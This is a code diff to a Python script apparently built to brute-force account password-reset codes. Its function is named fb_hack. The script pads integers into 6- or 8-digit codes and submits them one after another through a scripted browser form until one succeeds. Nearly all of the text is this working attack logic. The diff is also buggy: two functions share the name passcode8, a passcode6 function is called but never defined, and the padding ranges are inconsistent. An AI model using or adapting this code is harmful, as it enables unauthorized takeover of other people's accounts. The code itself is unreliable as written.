@@ -25,34 +25,79 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def passcode(pass0):
+def passcode8(pass0):
   pass1 = int(pass0)
   pass2 = int(pass0)
-  if pass1 < 100000 and pass1 > 9999:
+  if pass1 < 1000000 and pass1 > 99999:
     pass2 = str(pass1)
     h = ""
     code = ("0", str(pass2))
     yo = h.join(code)
+  elif pass1 < 100000 and pass1 > 9999:
+    h = ""
+    code = ("00", str(pass2))
+    yo = h.join(code)
   elif pass1 < 10000 and pass1 > 999:
     h = ""
-    code = ("0000", str(pass2))
+    code = ("000", str(pass2))
     yo = h.join(code)
   elif pass1 < 1000 and pass1 > 99:
     h = ""
+    code = ("0000", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 10 and pass1 >= 0:
+    h = ""
     code = ("00000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 100 and pass1 > 9:
-    h = ""
-    code = ("000000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10 and pass1 > 0:
-    h = ""
-    code = ("0000000", str(pass2))
     yo = h.join(code)
   elif pass1 < 0 :
     pass1 = 99999999
     yo = str(pass1)
   else:
+    yo = str(pass1)
+  return yo
+
+def passcode8(pass0):
+  pass1 = int(pass0)
+  pass2 = int(pass0)
+  """8"""
+  if pass1 < 10000000 and pass1 > 999999:
+    pass2 = str(pass1)
+    h = ""
+    code = ("0", str(pass2))
+    yo = h.join(code)
+    """7"""
+  elif pass1 < 1000000 and pass1 > 99999:
+    pass2 = str(pass1)
+    h = ""
+    code = ("00", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 100000 and pass1 > 9999:
+    pass2 = str(pass1)
+    h = ""
+    code = ("000", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 10000 and pass1 > 999:
+    pass2 = str(pass1)
+    h = ""
+    code = ("0000", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 1000 and pass1 > 99:
+    pass2 = str(pass1)
+    h = ""
+    code = ("00000", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 100 and pass1 > 9:
+    pass2 = str(pass1)
+    h = ""
+    code = ("000000", str(pass2))
+    yo = h.join(code)
+  elif pass1 < 10 and pass1 >= 0:
+    pass2 = str(pass1)
+    h = ""
+    code = ("0000000", str(pass2))
+    yo = h.join(code)
+  else:
+    pass1 = 99999999
     yo = str(pass1)
   return yo
 
@@ -90,13 +135,14 @@ def fb_hack(email, codex):
   if check1 != test:
     print(check1)
     reset = int(codex)
+    
   else:
     print(check2)
     reset = int(codex)
   if check1 != test:
     while check1 == check3:  
       browser.select_form(nr=0)
-      y = passcode(reset)
+      y = passcode6(reset)
       browser.form['n'] = y
       browser.submit()
       print(y, end='\r')
@@ -115,7 +161,7 @@ def fb_hack(email, codex):
   elif check2 == check4:
     while check2 == check4:
       browser.select_form(nr=0)
-      y = passcode(reset)
+      y = passcode8(reset)
       browser.form['n'] = y
       browser.submit()
       print(str(y), end='\r')
